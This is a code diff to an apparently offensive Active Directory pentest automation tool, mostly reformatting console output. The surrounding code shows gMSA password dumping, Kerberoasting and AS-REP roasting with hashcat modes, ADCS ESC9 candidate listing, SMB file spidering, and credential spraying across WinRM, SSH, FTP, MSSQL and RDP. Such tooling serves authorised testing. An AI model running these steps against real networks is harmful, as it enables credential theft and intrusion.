@@ -240,6 +240,10 @@ def _check_gmsa(
     findings.h4("gMSA Passwords")
     findings.cmd(" ".join(cmd))
     out = runner.run(cmd, "creds_gmsa", timeout=30)
+    if "invalid choice: 'gmsa'" in out or ("invalid choice" in out and "'gmsa'" in out):
+        findings.note("gMSA module not available in this nxc version — skipping")
+        print(f"    [-] gMSA: module unavailable")
+        return
     findings.code_block(_trim(out, lines=20))
     for line in out.splitlines():
         m = re.search(r"Account:\s*(\S+)\s+NTLM:\s*([0-9a-fA-F]{32})", line)
@@ -267,22 +271,24 @@ def _bloodyad_writable(
         "-p", pw,
         "get", "writable",
         "--otype", "USER",
-        "--attr", "sAMAccountName",
     ]
     findings.h4("Writable AD Objects (bloodyAD)")
     findings.cmd(" ".join(cmd))
     out = runner.run(cmd, "creds_bloodyad_writable", timeout=60)
     findings.code_block(_trim(out, lines=40))
 
+    def _san(s: str) -> str:
+        return re.sub(r"[\s._-]", "", s).lower()
+
     targets: list[str] = []
-    # Parse per-object blocks: each starts with a distinguishedName line.
-    # sAMAccountName is preferred; CN from the DN is the fallback (reliable for service accounts).
     current_sam: str | None = None
     current_dn_cn: str | None = None
 
     def _emit() -> None:
         name = current_sam or current_dn_cn
-        if name and not name.endswith("$") and name.lower() != user.lower() and name not in targets:
+        if (name and not name.endswith("$")
+                and _san(name) != _san(user)
+                and name not in targets):
             targets.append(name)
 
     for line in out.splitlines():
@@ -691,6 +697,16 @@ def _ad_core(
             else:
                 print(f"    [+] ldapdomaindump complete")
 
+    # Print users.txt contents after ldapdomaindump (or from prior scan phase)
+    _users_path = ws.loot_dir / "users.txt"
+    if _users_path.exists():
+        _user_lines = [l.strip() for l in _users_path.read_text().splitlines() if l.strip()]
+        if _user_lines:
+            for _u in _user_lines[:12]:
+                print(f"        {_u}")
+            if len(_user_lines) > 12:
+                print(f"        ... ({len(_user_lines) - 12} more in loot/users.txt)")
+
     # 2. Kerberoasting — SPN accounts → crackable hashes
     if "impacket-GetUserSPNs" in available:
         cmd = [
@@ -709,6 +725,7 @@ def _ad_core(
             findings.bullet(f"**{len(hashes)} Kerberoastable hashes** ({added} new) → `loot/kerberoast.hash`")
             findings.add_summary(f"{len(hashes)} Kerberoastable accounts — crack with hashcat -m 13100")
             print(f"    [+] {len(hashes)} Kerberoastable hashes ({added} new)")
+            print(f"        → loot/kerberoast.hash  [hashcat -m 13100]")
         else:
             if "error" in out.lower():
                 findings.code_block(_trim(out))
@@ -745,6 +762,7 @@ def _ad_core(
             findings.bullet(f"**{len(hashes)} AS-REP hashes** ({added} new) → `loot/asrep.hash`")
             findings.add_summary(f"{len(hashes)} AS-REP roastable accounts — crack with hashcat -m 18200")
             print(f"    [+] {len(hashes)} AS-REP hashes ({added} new)")
+            print(f"        → loot/asrep.hash  [hashcat -m 18200]")
         else:
             if "KRB5" in out or "error" in out.lower():
                 findings.code_block(_trim(out))
@@ -868,6 +886,8 @@ def _ad_core(
                         + " — gain enrollment rights (e.g. via group membership or ManageCA) to exploit via ESC9 chain"
                     )
                     print(f"    [+] {len(nosec_templates)} ESC9 candidate(s) detected — enrollment rights needed")
+                    for _ca, _tmpl in nosec_templates:
+                        print(f"        → {_tmpl} via {_ca}")
                 else:
                     findings.note("Full ADCS output saved to `loot/certipy_full.json` — review manually")
                 print(f"    [-] No directly exploitable templates — see findings for candidates")
@@ -938,9 +958,9 @@ def _smb_spider(
     if files:
         findings.bullet(f"**{len(files)} files downloaded** → `loot/creds_smb/{user}/`")
         findings.add_summary(f"SMB files downloaded for {user}: {len(files)} files in loot/creds_smb/{user}/")
-        print(f"      [+] {len(files)} SMB files downloaded → loot/creds_smb/{user}/")
+        print(f"        [+] {len(files)} SMB files downloaded → loot/creds_smb/{user}/")
     else:
-        print(f"      [-] No files downloaded from SMB")
+        print(f"        [-] No files downloaded from SMB")
 
 
 def _creds_smb(
@@ -957,7 +977,7 @@ def _creds_smb(
     findings.code_block(_trim(out))
     if "READ" in out or "WRITE" in out:
         ws.add_valid_cred(user, pw, f"SMB:{port}")
-        print(f"      [+] {user}: SMB shares readable — spidering...")
+        print(f"        [+] {user}: SMB shares readable — spidering...")
         _smb_spider(ip, user, pw, runner, findings, ws, available)
 
 
@@ -976,7 +996,7 @@ def _creds_winrm(
     if "[+]" in out:
         ws.add_valid_cred(user, pw, f"WinRM:{port}")
         findings.add_summary(f"WinRM access: `{user}` on port {port}")
-        print(f"      [+] {user}: WinRM:{port} valid")
+        print(f"        [+] {user}: WinRM:{port} valid")
         win_cmds = [
             ("whoami /all",                                                                      f"creds_winrm_whoami_all_{user}"),
             ("net localgroup administrators",                                                    f"creds_winrm_localadmins_{user}"),
@@ -990,7 +1010,7 @@ def _creds_winrm(
             out2 = runner.run(cmd2, label, timeout=30)
             findings.code_block(_trim(out2))
     else:
-        print(f"      [-] {user}: WinRM:{port} invalid")
+        print(f"        [-] {user}: WinRM:{port} invalid")
 
 
 def _creds_ssh(
@@ -1021,9 +1041,9 @@ def _creds_ssh(
     if out.strip() and "Permission denied" not in out and "Authentication failed" not in out:
         ws.add_valid_cred(user, pw, f"SSH:{port}")
         findings.add_summary(f"SSH access: `{user}` on port {port}")
-        print(f"      [+] {user}: SSH:{port} valid")
+        print(f"        [+] {user}: SSH:{port} valid")
     else:
-        print(f"      [-] {user}: SSH:{port} invalid")
+        print(f"        [-] {user}: SSH:{port} invalid")
 
 
 def _creds_ftp(
@@ -1045,14 +1065,14 @@ def _creds_ftp(
         ws.add_valid_cred(user, pw, f"FTP:{port}")
         findings.add_summary(f"FTP access: `{user}` on port {port}")
         findings.bullet("**FTP login successful**")
-        print(f"      [+] {user}: FTP:{port} valid")
+        print(f"        [+] {user}: FTP:{port} valid")
         if result.stdout.strip():
             findings.code_block(result.stdout.strip())
         else:
             findings.bullet("(empty directory listing)")
     else:
         findings.note(f"FTP login failed for `{user}` (exit {result.returncode})")
-        print(f"      [-] {user}: FTP:{port} invalid")
+        print(f"        [-] {user}: FTP:{port} invalid")
 
 
 def _creds_mssql(
@@ -1073,9 +1093,9 @@ def _creds_mssql(
     if "[+]" in out:
         ws.add_valid_cred(user, pw, f"MSSQL:{port}")
         findings.add_summary(f"MSSQL access: `{user}` on port {port}")
-        print(f"      [+] {user}: MSSQL:{port} valid")
+        print(f"        [+] {user}: MSSQL:{port} valid")
     else:
-        print(f"      [-] {user}: MSSQL:{port} invalid")
+        print(f"        [-] {user}: MSSQL:{port} invalid")
 
 
 def _creds_rdp(
@@ -1095,9 +1115,9 @@ def _creds_rdp(
     if "[+]" in out:
         ws.add_valid_cred(user, pw, f"RDP:{port}")
         findings.add_summary(f"RDP access: `{user}` on port {port}")
-        print(f"      [+] {user}: RDP:{port} valid")
+        print(f"        [+] {user}: RDP:{port} valid")
     else:
-        print(f"      [-] {user}: RDP:{port} invalid")
+        print(f"        [-] {user}: RDP:{port} invalid")
 
 
 # ── Per-service dispatcher ────────────────────────────────────────────────────
